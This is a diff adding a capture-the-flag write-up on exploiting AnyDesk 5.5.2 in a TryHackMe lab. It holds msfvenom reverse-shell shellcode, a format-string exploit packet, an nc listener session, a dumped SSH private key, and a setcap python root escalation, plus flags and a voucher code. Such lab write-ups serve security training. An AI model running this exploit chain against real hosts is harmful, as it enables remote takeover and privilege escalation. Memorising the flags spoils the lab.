@@ -196,3 +196,202 @@ def gen_discover_packet(ad_id, os, hn, user, inf, func):
   d += struct.pack('>I', len(func)) + func
   d += chr(0x2)+chr(0xc3)+chr(0x51)
   return d
+```
+
+## Exploitation
+```text
+# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
+shellcode =  b""
+shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
+shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x18\xc4\x4a"
+shellcode += b"\x40\x97\x12\xa2\xcb\x48\x31\x58\x27\x48\x2d"
+shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x72\xed\x12\xd9\xfd"
+shellcode += b"\x10\xfd\xa1\x19\x9a\x45\x45\xdf\x85\xea\x72"
+shellcode += b"\x1a\xc4\x5b\x1c\x9d\x1a\xb1\xac\x49\x8c\xc3"
+shellcode += b"\xa6\xfd\x02\xf8\xa1\x32\x9c\x45\x45\xfd\x11"
+shellcode += b"\xfc\x83\xe7\x0a\x20\x61\xcf\x1d\xa7\xbe\xee"
+shellcode += b"\xae\x71\x18\x0e\x5a\x19\xe4\x7a\xad\x24\x6f"
+shellcode += b"\xe4\x7a\xa2\x98\x50\x4d\xad\x12\xc0\x5a\x2b"
+shellcode += b"\x2d\x17\xc1\x4a\x40\x97\x12\xa2\xcb"
+
+print('sending payload ...')
+p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.sendto(p, (ip, port))
+s.close()
+print('reverse shell should connect within 5 seconds')
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python2 anydesk_rce.py                    
+sending payload ...
+reverse shell should connect within 5 seconds
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.162.206] 36990
+which python
+which python3
+/usr/bin/python3
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+annie@desktop:/home/annie$ ls
+ls
+Desktop    Downloads  Pictures  Templates  user.txt
+Documents  Music      Public    Videos
+annie@desktop:/home/annie$ cat user.txt
+cat user.txt
+THM{N0t_Ju5t_ANY_D3sk}
+
+annie@desktop:/home/annie$ ls -lah
+ls -lah
+total 96K
+drwxr-xr-x 17 annie annie 4.0K Mar 23  2022 .
+drwxr-xr-x  3 root  root  4.0K Mar 23  2022 ..
+-rw-------  1 annie annie  640 Mar 23  2022 .ICEauthority
+drwxr-xr-x  3 annie annie 4.0K Mar 23  2022 .anydesk
+-rwxrwxr-x  1 annie annie   41 Mar 23  2022 .anydesk.sh
+lrwxrwxrwx  1 annie annie    9 Mar 23  2022 .bash_history -> /dev/null
+-rw-r--r--  1 annie annie  220 Mar 23  2022 .bash_logout
+-rw-r--r--  1 annie annie 3.7K Mar 23  2022 .bashrc
+drwx------  8 annie annie 4.0K Mar 23  2022 .cache
+drwx------  9 annie annie 4.0K Mar 23  2022 .config
+drwx------  3 annie annie 4.0K Mar 23  2022 .dbus
+drwx------  3 annie annie 4.0K Mar 23  2022 .gnupg
+drwx------  3 annie annie 4.0K Mar 23  2022 .local
+-rw-r--r--  1 annie annie  807 Mar 23  2022 .profile
+-rw-r--r--  1 root  root    66 Mar 23  2022 .selected_editor
+drwxr-xr-x  2 annie annie 4.0K Mar 23  2022 .ssh
+-rw-r--r--  1 annie annie    0 Mar 23  2022 .sudo_as_admin_successful
+drwxr-xr-x  2 annie annie 4.0K Mar 23  2022 Desktop
+drwxr-xr-x  2 annie annie 4.0K Mar 23  2022 Documents
+drwxr-xr-x  2 annie annie 4.0K Mar 23  2022 Downloads
+drwxr-xr-x  2 annie annie 4.0K Mar 23  2022 Music
+drwxr-xr-x  2 annie annie 4.0K Mar 23  2022 Pictures
+drwxr-xr-x  2 annie annie 4.0K Mar 23  2022 Public
+drwxr-xr-x  2 annie annie 4.0K Mar 23  2022 Templates
+drwxr-xr-x  2 annie annie 4.0K Mar 23  2022 Videos
+-rw-rw-r--  1 annie annie   23 Mar 23  2022 user.txt
+annie@desktop:/home/annie$ cd .ssh
+cd .ssh
+annie@desktop:/home/annie/.ssh$ ls
+ls
+authorized_keys  id_rsa
+annie@desktop:/home/annie/.ssh$ cat id_rsa
+cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+b1Da9w==
+-----END OPENSSH PRIVATE KEY-----
+
+annie@desktop:/home/annie/.ssh$ find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
+< -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
+-rwsr-xr-x 1 root root 10232 Nov 16  2017 /sbin/setcap
+-rwsr-xr-x 1 root root 43088 Sep 16  2020 /bin/mount
+-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
+-rwsr-xr-x 1 root root 44664 Jan 25  2022 /bin/su
+-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 26696 Sep 16  2020 /bin/umount
+-rwsr-xr-- 1 root dip 378600 Jul 23  2020 /usr/sbin/pppd
+-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 436552 Mar  2  2020 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 14328 Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-sr-x 1 root root 10232 Dec 14  2021 /usr/lib/xorg/Xorg.wrap
+-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 22528 Jun 28  2019 /usr/bin/arping
+-rwsr-xr-x 1 root root 40344 Jan 25  2022 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 149080 Jan 19  2021 /usr/bin/sudo
+-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root root 76496 Jan 25  2022 /usr/bin/chfn
+-rwsr-xr-x 1 root root 75824 Jan 25  2022 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 44528 Jan 25  2022 /usr/bin/chsh
+-rwsr-xr-x 1 root root 59640 Jan 25  2022 /usr/bin/passwd
+-rwsr-xr-x 1 root root 22520 Jan 12  2022 /usr/bin/pkexec
+
+https://gtfobins.github.io/gtfobins/python/
+
+annie@desktop:/home/annie$ cp $(which python3) .
+cp $(which python3) .
+annie@desktop:/home/annie$ ls
+ls
+Desktop    Downloads  Pictures  Templates  python3
+Documents  Music      Public    Videos     user.txt
+
+or cp /usr/bin/python3 /home/annie/python3
+
+annie@desktop:/home/annie$ setcap cap_setuid+ep python3
+setcap cap_setuid+ep python3
+
+annie@desktop:/home/annie$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+< -c 'import os; os.setuid(0); os.system("/bin/sh")'
+```
+```text
+# cd /root
+cd /root
+```
+
+## Privilege Escalation
+```text
+# ls
+ls
+THM-Voucher.txt  root.txt
+```
+```text
+# cat root.txt
+cat root.txt
+THM{0nly_th3m_5.5.2_D3sk}
+```
+```text
+# cat THM-Voucher.txt
+cat THM-Voucher.txt
+Congratz to the blood-taker!
+Prize is a 1 month THM subscription voucher:
+Q9oimd
+```
+What is user.txt?
+What is root.txt?
+
+## Flags / Answers
+- ***THM{N0t_Ju5t_ANY_D3sk}***
+- ***THM{0nly_th3m_5.5.2_D3sk}***
+
+## Notes / Lessons Learned
+[[Lockdown]]
+
